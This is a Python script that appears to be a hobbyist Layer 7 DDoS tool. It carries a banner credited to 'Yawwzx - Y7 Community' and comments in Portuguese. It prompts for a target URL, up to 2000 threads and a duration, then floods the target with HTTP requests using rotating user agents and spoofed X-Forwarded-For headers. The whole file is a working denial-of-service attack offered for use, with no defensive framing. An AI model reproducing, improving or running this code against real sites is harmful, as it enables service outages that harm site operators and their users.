#!/usr/bin/env python3
import socket, threading, time, random, string, requests, os
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)

class DDoSLayer7:                                                                                                                        def __init__(self):
        self.stats = {"requests": 0, "errors": 0}
        self.running = True
        self.max_threads = 2000 # Aumentado para maior pressão
        self.request_timeout = 3 # Timeout menor para girar threads rápido

    def generate_headers(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15'
        ]
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }

    def send_request_python(self, url):
        while self.running:
            try:
                headers = self.generate_headers()
                # Requisição direta sem delay para máxima velocidade
                response = requests.get(url, headers=headers, timeout=self.request_timeout)
                self.stats["requests"] += 1

                # LOG EM TEMPO REAL NO TERMUX
                print(f"{Fore.GREEN}[SEND]{Fore.WHITE} Request sent to {url} | Status: {response.status_code}")

            except Exception as e:
                self.stats["errors"] += 1
                print(f"{Fore.RED}[ERROR]{Fore.WHITE} Connection failed")

    def attack(self, url, threads, duration):
        end_time = time.time() + duration
        print(f"{Fore.CYAN}[*] Iniciando fluxo agressivo em {threads} threads...{Style.RESET_ALL}")

        # Uso de Pool de Threads para gerenciar o alto volume
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(self.send_request_python, url)

            while time.time() < end_time:
                time.sleep(1)

        self.running = False
        print(f"\n{Fore.YELLOW}[!] Tempo esgotado. Finalizando threads...")

    # Limpa a tela do terminal
    os.system('clear' if os.name == 'posix' else 'cls')

    def show_banner(self):
        banner = f"""{Fore.WHITE}
      ╔════════════════════════════════════════════════════════╗
      ║  ██╗   ██╗███████╗   ██████╗ ██████╗  ██████╗ ███████╗ ║
      ║  ╚██╗ ██╔╝╚════██║   ██╔══██╗██╔══██╗██╔═══██╗██╔════╝ ║
      ║   ╚████╔╝     ██╔╝   ██║  ██║██║  ██║██║   ██║███████╗ ║
      ║    ╚██╔╝     ██╔╝    ██║  ██║██║  ██║██║   ██║╚════██║ ║
      ║     ██║     ██╔╝     ██████╔╝██████╔╝║█████╔╝ ███████║ ║
      ║     ╚═╝     ╚═╝      ╚═════╝ ╚═════╝ ╚═════╝  ╚══════╝ ║
      ║    {Fore.RED}Por Yawwzx - Y7 Community{Fore.WHITE}                           ║
      ╚════════════════════════════════════════════════════════╝
        """
        print(banner)

    def run(self):
        self.show_banner()
        url = input(f"{Fore.WHITE}URL Alvo: {Style.RESET_ALL}").strip()
        if not url.startswith('http'):
            url = 'http://' + url

        threads = int(input(f"Threads (Max {self.max_threads}): ") or 500)
        duration = int(input(f"Duração (segundos): ") or 60)

        try:
            self.attack(url, threads, duration)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.RED}[!] Parado manualmente.")

if __name__ == "__main__":
    app = DDoSLayer7()
    app.run()